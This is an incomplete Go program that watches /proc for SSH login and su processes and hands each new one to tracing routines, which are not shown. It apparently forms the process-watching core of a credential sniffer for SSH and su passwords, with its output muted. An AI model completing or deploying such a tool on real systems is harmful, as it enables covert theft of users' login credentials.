package main

import (
	"fmt"
	"io/ioutil"
	"os"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"time"
)

func findPids() []int {
	var sshdPids []int
	currentPID := os.Getpid()
	procDirs, err := ioutil.ReadDir("/proc")
	if err != nil {
		return nil
	}
	for _, dir := range procDirs {
		if dir.IsDir() {
			pid, err := strconv.Atoi(dir.Name())
			if err == nil && pid != currentPID {
				sshdPids = append(sshdPids, pid)
			}
		}
	}
	return sshdPids
}

func isSSHPid(pid int) bool {
	cmdLine, err := ioutil.ReadFile(fmt.Sprintf("/proc/%d/cmdline", pid))
	if err != nil {
		return false
	}
	return regexp.MustCompile(`sshd: ([a-zA-Z]+) \[net\]`).MatchString(strings.ReplaceAll(string(cmdLine), "\x00", " "))
}

func isSUPid(pid int) bool {
	cmdLine, err := ioutil.ReadFile(fmt.Sprintf("/proc/%d/cmdline", pid))
	if err != nil {
		return false
	}
	return regexp.MustCompile(`^su `).MatchString(strings.ReplaceAll(string(cmdLine), "\x00", " "))
}

func main() {
	var processedFirstPID bool
	var processedPids []int
	var processedPidsMutex sync.Mutex

	// fmt.Printf("Tracking: SSH, SU\n")
	// fmt.Println()

	for {
		pids := findPids()
		for _, pid := range pids {
			processedPidsMutex.Lock()

			if isSSHPid(pid) && (!processedFirstPID || !contains(processedPids, pid)) {
				if !processedFirstPID {
					processedFirstPID = true
				} else {
					// fmt.Println("SSHD process found with PID:", pid)
					go traceSSHDProcess(pid)
					processedPids = append(processedPids, pid)
				}
			}

			if isSUPid(pid) && (!processedFirstPID || !contains(processedPids, pid)) {
				if !processedFirstPID {
					processedFirstPID = true
				} else {
					// fmt.Println("SU process found with PID:", pid)
					go traceSUProcess(pid)
					processedPids = append(processedPids, pid)
				}
			}

			processedPidsMutex.Unlock()
		}
		time.Sleep(250 * time.Millisecond)
	}
}
